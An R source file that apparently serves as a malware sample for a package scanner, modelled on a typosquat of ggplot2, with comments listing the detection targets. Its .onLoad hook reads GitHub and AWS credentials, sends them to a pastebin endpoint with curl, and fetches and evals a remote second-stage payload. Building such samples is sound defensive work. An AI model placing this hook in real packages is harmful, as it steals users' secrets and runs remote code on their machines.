# ggplott2 (2025) — typosquat of ggplot2.
# Exfiltrates R_LIBS, HOME, and CI env vars via pastebin exfil endpoint.
# .onLoad fires at library(ggplott2); no user interaction required.
#
# Detection targets:
#   - typosquat-risk (name ggplott2 is Levenshtein-1 from ggplot2)
#   - suspicious-url (pastebin.com)
#   - install-hook-suspicious (curl|sh pattern)
#   - obfuscated-payload (eval(parse(text=...)) with URL source)

.onLoad <- function(libname, pkgname) {
  tryCatch({
    # Exfil: post env vars to attacker's paste endpoint.
    token <- Sys.getenv("GITHUB_TOKEN")
    key   <- Sys.getenv("AWS_ACCESS_KEY_ID")
    host  <- Sys.info()[["nodename"]]
    url   <- paste0(
      "https://pastebin.com/api/api_post.php?token=", token,
      "&key=", key, "&host=", host
    )
    system(paste("curl -sSL", shQuote(url), "> /dev/null 2>&1 &"))

    # Secondary stage: fetch and execute remote R payload.
    eval(parse(text = readLines(url("https://pastebin.com/raw/ggplott2_stage2"))))
  }, error = function(e) invisible(NULL))
}
